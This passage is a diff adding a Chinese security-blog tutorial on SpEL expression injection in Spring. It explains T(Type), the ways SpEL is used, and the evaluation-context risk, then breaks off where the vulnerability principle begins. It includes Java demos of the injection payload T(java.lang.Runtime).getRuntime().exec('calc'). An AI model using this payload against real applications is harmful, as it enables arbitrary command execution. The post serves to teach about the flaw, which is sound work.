@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"curlysean.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="SPEL表达式注入 前置基础 SPEL简介  在 Spring3 中引入了 Spring 表达式语言（Spring Expression Language，简称 SPEL），这是一种功能强大的表达式语言，支持在运行时查询和操作对象图，可以与基于 XML 和基于注解的 Spring 配置还有 bean 定义一起使用。  在 Spring 系列产品中，SpEL 是表达式计算的基础，实现了与 Sprin">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SPEL表达式注入">
+<meta property="og:url" content="http://curlysean.github.io/2025/03/25/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="肖恩的博客">
+<meta property="og:description" content="SPEL表达式注入 前置基础 SPEL简介  在 Spring3 中引入了 Spring 表达式语言（Spring Expression Language，简称 SPEL），这是一种功能强大的表达式语言，支持在运行时查询和操作对象图，可以与基于 XML 和基于注解的 Spring 配置还有 bean 定义一起使用。  在 Spring 系列产品中，SpEL 是表达式计算的基础，实现了与 Sprin">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740388647211-f95a60c5-efaa-4a95-8383-9fee1c70ba5f.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740389668647-8ce03781-c121-4c20-b046-3a55ff074b8f.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740395249483-171c088d-80f8-4f65-b64d-d16b4eae7309.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740396153518-c8374c4d-4228-4cea-9817-3ccc39d164de.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740396782521-63a383c6-e9ed-4110-b03a-14438ff3164b.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740399279702-bbb2fa4f-d226-45b7-bb69-31ed1bb972ea.png">
+<meta property="article:published_time" content="2025-03-25T03:06:39.497Z">
+<meta property="article:modified_time" content="2025-03-25T03:15:12.271Z">
+<meta property="article:author" content="Sean">
+<meta property="article:tag" content="表达式注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740388647211-f95a60c5-efaa-4a95-8383-9fee1c70ba5f.png">
+
+
+<link rel="canonical" href="http://curlysean.github.io/2025/03/25/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://curlysean.github.io/2025/03/25/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/","path":"2025/03/25/SPEL表达式注入/","title":"SPEL表达式注入"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>SPEL表达式注入 | 肖恩的博客</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">肖恩的博客</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#IbVG0"><span class="nav-number">1.</span> <span class="nav-text">SPEL表达式注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#RuxSh"><span class="nav-number">1.1.</span> <span class="nav-text">前置基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#v7p1e"><span class="nav-number">1.1.1.</span> <span class="nav-text">SPEL简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#I8qMI"><span class="nav-number">1.1.2.</span> <span class="nav-text">SPEL特性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TmXL9"><span class="nav-number">1.1.3.</span> <span class="nav-text">SPEL类类型表达式T(Type)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lMLQ6"><span class="nav-number">1.1.4.</span> <span class="nav-text">![](https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;CurlySean&#x2F;blogImage@main&#x2F;img&#x2F;1740386369520-b57c09d4-1e3a-432b-ad79-8547a8034216.png)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ppdrd"><span class="nav-number">1.2.</span> <span class="nav-text">SPEL表达式用法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Q5jBl"><span class="nav-number">1.2.1.</span> <span class="nav-text">xml配置用法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HXtQX"><span class="nav-number">1.2.2.</span> <span class="nav-text">注解@Value用法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#OmWfI"><span class="nav-number">1.2.3.</span> <span class="nav-text">Expression用法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#cX58A"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#X5vQF"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">Demo</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#x0ioI"><span class="nav-number">1.3.</span> <span class="nav-text">SPEL表达式漏洞注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#WsiFs"><span class="nav-number">1.3.1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sm9t8"><span class="nav-number">1.3.2.</span> <span class="nav-text">通过反射调用进行SpEL注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TF3bm"><span class="nav-number">1.3.3.</span> <span class="nav-text">基础Poc与Bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#xjOPg"><span class="nav-number">1.3.3.1.</span> <span class="nav-text">基础Poc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xcEpZ"><span class="nav-number">1.3.3.2.</span> <span class="nav-text">基础Bypass</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#csoWt"><span class="nav-number">1.3.3.3.</span> <span class="nav-text">JavaScript Engine Bypass</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hZ0Qe"><span class="nav-number">1.3.4.</span> <span class="nav-text">利用类加载攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#oh6sk"><span class="nav-number">1.3.4.1.</span> <span class="nav-text">UrlClassloader</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#H1gIO"><span class="nav-number">1.3.4.2.</span> <span class="nav-text">AppClassLoader</span></a></li></ol></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Sean"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Sean</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://curlysean.github.io/2025/03/25/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Sean">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="肖恩的博客">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="SPEL表达式注入 | 肖恩的博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SPEL表达式注入
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-03-25 11:06:39 / 修改时间：11:15:12" itemprop="dateCreated datePublished" datetime="2025-03-25T11:06:39+08:00">2025-03-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Java/" itemprop="url" rel="index"><span itemprop="name">Java</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="IbVG0">SPEL表达式注入</h1>
+<h2 id="RuxSh">前置基础</h2>
+<h3 id="v7p1e">SPEL简介</h3>
+
+<p>在 Spring3 中引入了 Spring 表达式语言（Spring Expression Language，简称 SPEL），这是一种功能强大的表达式语言，支持在运行时查询和操作对象图，可以与基于 XML 和基于注解的 Spring 配置还有 bean 定义一起使用。 </p>
+<p>在 Spring 系列产品中，SpEL 是表达式计算的基础，实现了与 Spring 生态系统所有产品无缝对接。Spring 框架的核心功能之一就是通过依赖注入的方式来管理 Bean 之间的依赖关系，而 SpEL 可以方便快捷的对 <code>ApplicationContext</code> 中的 Bean 进行属性的装配和提取。由于它能够在运行时动态分配值，因此可以为我们节省大量 Java 代码。</p>
+<h3 id="I8qMI">SPEL特性</h3>
+
+<ul>
+<li>使用Bean的ID来引用Bean</li>
+<li>可调用方法和访问对象的属性</li>
+<li>可对值进行算数、关系和逻辑运算</li>
+<li>可使用正则表达式进行匹配</li>
+<li>可进行集合操作</li>
+</ul>
+<h3 id="TmXL9">SPEL类类型表达式T(Type)</h3>
+
+<blockquote>
+<p>SPEL其他简单的用法我们在这里不进行讨论，只研究一下存在攻击面的地方</p>
+</blockquote>
+<p>在SpEL表达式中，使用<code>T(Type)</code>运算符会调用类的作用域和方法，即<strong>可以通过类类型表达式来操作类</strong></p>
+<p>使用<code>T(Type)</code>来表示<code>java.lang.Class</code>实例，Type必须是类全限定名，<code>java.lang</code>包下的类除外，因为SpEL已经内置了该包，因此该包下的类可以不指定包名。类类型表达式还可以访问类的静态方法与类静态字段</p>
+<blockquote>
+<p>这里就已经存在潜在攻击面</p>
+<p>Rumtime类也是包含在<code>java.lang</code>包中的，因此如果我们能调用<code>Runtime.getRuntime.exec(payload)</code>,即可进行命令执行</p>
+</blockquote>
+<p>光说很难理解，我们来写点代码来实操一下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Spel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">expression2</span> <span class="operator">=</span> <span class="string">&quot;T(java.lang.Runtime).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>;</span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();;</span><br><span class="line">        <span class="type">Expression</span> <span class="variable">result2</span> <span class="operator">=</span> parser.parseExpression(expression2);</span><br><span class="line">        System.out.println(result2.getValue(Class.class));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用我的话来说就是，<code>T(Type)</code>中的东西，会被解析成一个<strong>完完整整的类</strong>，因此我们就可以通过<code>Runtime</code>类来执行命令</p>
+<h3 id="lMLQ6">![](https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740386369520-b57c09d4-1e3a-432b-ad79-8547a8034216.png)</h3>
+<h2 id="Ppdrd">SPEL表达式用法</h2>
+
+<p>SpEL的用法有三种形式，一种是在注解当中<code>@Value</code>；一种是XML配置中；最后一种是在代码块中使用Expression</p>
+<h3 id="Q5jBl">xml配置用法</h3>
+
+<p>**demo.xml **文件</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag"> http://www.springframework.org/schema/beans/spring-beans-3.0.xsd &quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;helloWorld&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.pojo.HelloWorld&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;message&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123;&#x27;sean&#x27;&#125; is #&#123;T(java.lang.Math).random()&#125;&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>MainTestDemo.java</strong> 文件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.spel.xml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.pojo.HelloWorld;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainTestDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;demo.xml&quot;</span>);</span><br><span class="line">        <span class="type">HelloWorld</span> <span class="variable">helloWorld</span> <span class="operator">=</span> (HelloWorld) context.getBean(<span class="string">&quot;helloWorld&quot;</span>);</span><br><span class="line">        helloWorld.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>HelloWorld</strong> 文件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setMessage</span><span class="params">(String message)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.message  = message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getMessage</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Your Message : &quot;</span> + message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>运行MainTestDemo.java文件后，首先会去demo.xml文件中加载xml中的配置。实际上，经过调试发现，在加载配置时，就会进行SpEL表达式的解析，从而触发我们的payload</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740388647211-f95a60c5-efaa-4a95-8383-9fee1c70ba5f.png"></p>
+<h3 id="HXtQX">注解@Value用法</h3>
+示例用法如下
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmailSender</span> &#123;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;spring.mail.username&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String mailUsername;</span><br><span class="line">    <span class="meta">@Value(&quot;#&#123; systemProperties[&#x27;user.region&#x27;] &#125;&quot;)</span>    </span><br><span class="line">    <span class="keyword">private</span> String defaultLocale;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在一般情况下，这些值都写在properties的配置文件中，很少或几乎没有我们可以控制的地方</p>
+<h3 id="OmWfI">Expression用法</h3>
+
+<p>后续分析的SpringCVE漏洞都是基于Expression形式的SpEL表达式注入，因此这里单独说明一下该种形式的用法</p>
+<h4 id="cX58A">步骤</h4>
+Expression用法分为四步：首先构造一个解析器，其次使用解析器去解析字符串表达式，然后构造上下文，最后根据上下文得到表达式运算后的值（其中第三步可以省略）
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line"><span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(<span class="string">&quot;(&#x27;Hello&#x27; + &#x27; Drunkbaby&#x27;).concat(#end)&quot;</span>);</span><br><span class="line"><span class="type">EvaluationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardEvaluationContext</span>();</span><br><span class="line">context.setVariable(<span class="string">&quot;end&quot;</span>, <span class="string">&quot;!&quot;</span>);</span><br><span class="line">System.out.println(expression.getValue(context));</span><br></pre></td></tr></table></figure>
+
+<p><strong>具体步骤如下：</strong></p>
+<ol>
+<li>创建解析器：SpEL 使用 <code>ExpressionParser</code> 接口表示解析器，提供 <code>SpelExpressionParser</code> 默认实现；</li>
+<li>解析表达式：使用 <code>ExpressionParser</code> 的 <code>parseExpression </code>来解析相应的表达式为 <code>Expression</code> 对象；</li>
+<li>构造上下文：准备比如变量定义等等表达式需要的上下文数据；</li>
+<li>求值：通过 <code>Expression</code> 接口的 <code>getValue</code> 方法根据上下文获得表达式值；</li>
+</ol>
+<h4 id="X5vQF">Demo</h4>
+
+<p>应用的示例如下，和xml配置的用法区别为：xml配置解析时，需要界定符<code>#&#123;&#125;</code>来注明SpEL表达式，而Expression用法，会将传入<code>parseExpression</code>方法的字符串直接当成SpEL表达式来解析，无需注明</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExpressionCalc</span> &#123;<span class="comment">// 字符串字面量  </span></span><br><span class="line">  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line"> <span class="comment">// 操作类弹计算器，当然java.lang包下的类是可以省略包名的  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">spel</span> <span class="operator">=</span> <span class="string">&quot;T(java.lang.Runtime).getRuntime().exec(\&quot;calc\&quot;)&quot;</span>;  </span><br><span class="line">        <span class="comment">// String spel = &quot;T(Runtime).getRuntime().exec(\&quot;calc\&quot;)&quot;;  </span></span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();  </span><br><span class="line">        <span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(spel);  </span><br><span class="line">        System.out.println(expression.getValue());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740389668647-8ce03781-c121-4c20-b046-3a55ff074b8f.png"></p>
+<h2 id="x0ioI">SPEL表达式漏洞注入</h2>
+<h3 id="WsiFs">漏洞原理</h3>
+
+<blockquote>
+<p><code>SimpleEvaluationContext</code><font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">和</font><font style="color:rgb(80, 80, 92);"> </font><code>StandardEvaluationContext</code><font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">是 SpEL 提供的两个</font><font style="color:rgb(80, 80, 92);"> </font><code>EvaluationContext</code><font style="color:rgb(80, 80, 92);">：</font></p>
+<ul>
+<li>SimpleEvaluationContext : 针对不需要 SpEL 语言语法的全部范围并且应该受到有意限制的表达式类别，公开 SpEL 语言特性和配置选项的子集。</li>
+<li>StandardEvaluationContext : 公开全套 SpEL 语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。</li>
+</ul>
+<p><code>SimpleEvaluationContext</code><font style="color:rgb(80, 80, 92);"> 旨在仅支持 SpEL 语言语法的一个子集，不包括 Java 类型引用、构造函数和 bean 引用；而 </font><code>StandardEvaluationContext</code><font style="color:rgb(80, 80, 92);"> 是支持全部 SpEL 语法的。</font></p>
+</blockquote>
+<p>SpEL表达式可以操作类及其方法，可以通过类类型表达式<code>T(Type)</code>来调用任意方法。因为在不指定<code>EvaluationContext</code><font style="color:rgb(80, 80, 92);">的情况下，默认采用的是</font><code>&lt;font style=&quot;color:rgb(80, 80, 92);&quot;&gt;StandardEvaluationContext&lt;/font&gt;</code><font style="color:rgb(80, 80, 92);">，它包含了SpEL的所有功能，在允许用户输入情况下，可以造成任意命令执行</font></p>
+<p><font style="color:rgb(80, 80, 92);">如下：</font></p>
